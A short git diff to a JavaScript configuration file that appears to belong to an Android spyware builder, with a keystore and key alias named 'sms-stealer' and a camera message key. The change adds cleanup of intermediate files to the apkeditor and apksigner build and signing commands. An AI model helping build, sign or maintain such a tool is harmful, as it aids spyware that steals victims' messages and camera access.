@@ -24,16 +24,16 @@ exports.patchFilePath = path.join(exports.smaliPath, 'smali/classes/com/hax4us/h
 // Build command using apkeditor (no apktool)
 exports.buildCommand = `apkeditor b -i "${exports.smaliPath}" -o "${exports.apkBuildPath}"`;
 
-// Sign command using apksigner (sign.jar removed)
+// Sign command using apksigner, with cleanup of intermediate files
 const keystorePath = path.join(__dirname, '../app/factory/', 'sms-stealer.keystore');
 const keystorePassword = "sms-stealer";
 const keyAlias = "sms-stealer";
 
-exports.signCommand = `apksigner sign --ks "${keystorePath}" --ks-key-alias ${keyAlias} --ks-pass pass:${keystorePassword} --out "${exports.apkSignedBuildPath}" "${exports.apkBuildPath}"`;
+exports.signCommand = `apksigner sign --ks "${keystorePath}" --ks-key-alias ${keyAlias} --ks-pass pass:${keystorePassword} --out "${exports.apkSignedBuildPath}" "${exports.apkBuildPath}" && rm -f "${exports.apkBuildPath}" "${exports.apkSignedBuildPath}.idsig"`;
 
-// Termux commands: build with apkeditor, sign with apksigner
+// Termux commands: build with apkeditor, sign with apksigner, then cleanup
 exports.termuxBuildCommand = `apkeditor b -i "${exports.smaliPath}" -o "${exports.termuxApkBuildPath}"`;
-exports.termuxSignCommand = `apksigner sign --ks "${keystorePath}" --ks-key-alias ${keyAlias} --ks-pass pass:${keystorePassword} --out "${exports.termuxApkSignedBuildPath}" "${exports.termuxApkBuildPath}"`;
+exports.termuxSignCommand = `apksigner sign --ks "${keystorePath}" --ks-key-alias ${keyAlias} --ks-pass pass:${keystorePassword} --out "${exports.termuxApkSignedBuildPath}" "${exports.termuxApkBuildPath}" && rm -f "${exports.termuxApkBuildPath}" "${exports.termuxApkSignedBuildPath}.idsig"`;
 
 exports.messageKeys = {
     camera: '0xCA',
